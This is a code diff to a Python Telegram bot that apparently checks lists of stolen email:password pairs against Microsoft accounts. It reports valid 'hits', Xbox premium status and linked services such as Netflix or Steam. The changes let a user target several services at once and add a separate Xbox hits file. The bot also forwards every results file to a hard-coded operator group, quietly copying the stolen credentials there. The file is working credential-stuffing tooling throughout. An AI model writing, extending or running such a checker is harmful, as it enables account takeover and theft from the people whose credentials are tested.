@@ -1265,6 +1265,7 @@ class ScanSession:
         self.last_status_time = 0.0
         self.awaiting_domain = False
         self.custom_domain = None
+        self.custom_domains = []          # multiple custom targets (comma-separated input)
         self.pending_accounts = None
         self.status_msg_id = None
         self.xbox_premium = 0
@@ -1307,9 +1308,11 @@ class BotApp:
                     f"bad : {sess.bads}\n"
                     f"type : {types_str}\n"
                     f"services : {services}\n"
-                    "By : anon\n"
-                    "channel : @anon_main1"
                 )
+                if sess.custom_domains:
+                    tgt_pairs = [f"{t}:{sess.service_counts.get(t,0)}" for t in sess.custom_domains]
+                    msg += f"your targert services : {', '.join(tgt_pairs)}\n"
+                msg += "By : anon\nchannel : @anon_main1"
             else:
                 countries = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
                 services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
@@ -1320,9 +1323,11 @@ class BotApp:
                     f"xbox : {sess.xbox_premium}\n"
                     f"country : {countries}\n"
                     f"services : {services}\n"
-                    "By : anon\n"
-                    "channel : @anon_main1"
                 )
+                if sess.custom_domains:
+                    tgt_pairs = [f"{t}:{sess.service_counts.get(t,0)}" for t in sess.custom_domains]
+                    msg += f"your targert services : {', '.join(tgt_pairs)}\n"
+                msg += "By : anon\nchannel : @anon_main1"
         if sess.status_msg_id:
             edit_message(chat_id, sess.status_msg_id, msg)
         else:
@@ -1351,10 +1356,9 @@ class BotApp:
                     except: pass
 
                 send_file_with_name(sess.batch, "hits.txt")
-                send_file_with_name(sess.batch_services, "services.txt")
                 send_file_with_name(sess.batch_xbox, "xbox.txt")
                 
-                sess.batch.clear(); sess.batch_services.clear(); sess.batch_xbox.clear()
+                sess.batch.clear(); sess.batch_xbox.clear(); sess.batch_services.clear()
             except:
                 pass
 
@@ -1377,7 +1381,7 @@ class BotApp:
         
         is_vip = (chat_id in vip_users_info)
         vip_tag = " [VIP]" if is_vip else ""
-        flush_threshold = 50 if is_vip else 100
+        flush_threshold = 50
         
         send_message(chat_id, f"Started {mode_name} scan: {sess.total} accounts{vip_tag}", reply_markup=kb)
         self._send_status(sess, chat_id, force=True)
@@ -1429,7 +1433,12 @@ class BotApp:
                 # Regular Mail Access Logic (Microsoft)
                 try:
                     checker = UnifiedChecker(debug=False)
-                    if sess.custom_domain:
+                    if getattr(sess, "custom_domains", None):
+                        for dom in sess.custom_domains:
+                            d = dom.strip()
+                            if d:
+                                checker.services_map[d] = d
+                    elif sess.custom_domain:
                         checker.services_map[sess.custom_domain.strip()] = "Custom"
                     r = checker.check(em, pw)
                 except:
@@ -1447,7 +1456,7 @@ class BotApp:
                     # services-only line
                     sv = r.get("services", {}) or {}
                     sv_found = [k for k, v in sv.items() if v]
-                    services_line = f"{r.get('email','')}:{r.get('password','')} | Services: {', '.join(sv_found)}" if sv_found else None
+                    services_line = None
                     # xbox-only line (premium and not expired shows details)
                     xbox_line = None
                     xb = (r.get("xbox") or {})
@@ -1458,8 +1467,7 @@ class BotApp:
                     with self.lock:
                         sess.results.append(line)
                         sess.hits += 1
-                        if services_line:
-                            sess.results_services.append(services_line)
+                        # no services-only file output
                         if xbox_line:
                             sess.results_xbox.append(xbox_line)
                         # update aggregates
@@ -1479,8 +1487,6 @@ class BotApp:
                     # Batch-send every 100 hits
                     with sess.hits_batch_lock:
                         sess.batch.append(line)
-                        if services_line:
-                            sess.batch_services.append(services_line)
                         if xbox_line:
                             sess.batch_xbox.append(xbox_line)
                         if len(sess.batch) >= flush_threshold:
@@ -1516,49 +1522,33 @@ class BotApp:
         # flush remaining batch
         self._flush_batch(sess, chat_id)
         try:
-            # send full services counts file
-            if sess.service_counts:
-                sc_sorted = sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))
-                sc_name = f"services_counts_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
-                sc_path = os.path.join(os.getcwd(), sc_name)
-                with open(sc_path, "w", encoding="utf-8") as f:
-                    for k, v in sc_sorted:
-                        f.write(f"{k}:{v} | BY : @T_Q_mailbot\n")
-                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                user_tag = sess.username or str(chat_id)
-                send_document(chat_id, sc_path, caption=f"services_counts ({len(sc_sorted)})")
-                try: send_document(GROUP_ID, sc_path, caption=f"{user_tag}{vip_tag} | services_counts ({len(sc_sorted)})")
-                except: pass
-                try: os.remove(sc_path)
-                except: pass
-            if sess.country_results:
-                for c, lines in sess.country_results.items():
-                    if not lines:
-                        continue
-                    fname = f"country_{c}.txt"
-                    fpath = os.path.join(os.getcwd(), fname)
-                    with open(fpath, "w", encoding="utf-8") as f:
-                        for ln in lines:
-                            f.write(ln + " | BY : @T_Q_mailbot\n")
-                    vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                    user_tag = sess.username or str(chat_id)
-                    send_document(chat_id, fpath, caption=f"{fname} ({len(lines)})")
-                    try: send_document(GROUP_ID, fpath, caption=f"{user_tag}{vip_tag} | {fname} ({len(lines)})")
-                    except: pass
-                    try: os.remove(fpath)
-                    except: pass
             name = f"results_{uuid.uuid4().hex[:8]}.txt"
             path = os.path.join(os.getcwd(), name)
             with open(path, "w", encoding="utf-8") as f:
                 for ln in sess.results:
                     f.write(ln + " | BY : @T_Q_mailbot\n")
+            # xbox file (separate)
+            xbox_path = None
+            if sess.results_xbox:
+                xbox_name = f"xbox_{uuid.uuid4().hex[:8]}.txt"
+                xbox_path = os.path.join(os.getcwd(), xbox_name)
+                with open(xbox_path, "w", encoding="utf-8") as f:
+                    for ln in sess.results_xbox:
+                        f.write(ln + " | BY : @T_Q_mailbot\n")
             send_document(chat_id, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
+            if xbox_path:
+                send_document(chat_id, xbox_path, caption=f"xbox ({len(sess.results_xbox)})")
             try:
                 vip_tag = " [VIP]" if chat_id in vip_users_info else ""
                 user_tag = sess.username or str(chat_id)
                 send_document(GROUP_ID, path, caption=f"{user_tag}{vip_tag} | Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
+                if xbox_path:
+                    send_document(GROUP_ID, xbox_path, caption=f"{user_tag}{vip_tag} | xbox ({len(sess.results_xbox)})")
             except:
                 pass
+            try:
+                if xbox_path: os.remove(xbox_path)
+            except: pass
         except:
             send_message(chat_id, "Failed to prepare results")
         with self.lock:
@@ -1642,7 +1632,7 @@ class BotApp:
         else:
             sess.awaiting_domain = True
             kb = {"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]}
-            send_message(chat_id, "Send an extra sender domain to scan (e.g., netflix.com) or press Skip", reply_markup=kb)
+            send_message(chat_id, "Send target services/domains (comma separated), e.g.: netflix.com, steam, ...\nOr press Skip", reply_markup=kb)
 
     def _handle_free_flow(self, chat_id, sess):
         accounts = sess.pending_accounts
@@ -1784,7 +1774,9 @@ class BotApp:
                             # handle domain input
                             if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
                                 if txt.lower() != "skip":
-                                    sess.custom_domain = txt
+                                    parts = re.split(r'[,\u060C]+', txt)
+                                    sess.custom_domains = [p.strip() for p in parts if p.strip()]
+                                    sess.custom_domain = None
                                 sess.awaiting_domain = False
                                 accs = sess.pending_accounts
                                 sess.pending_accounts = None
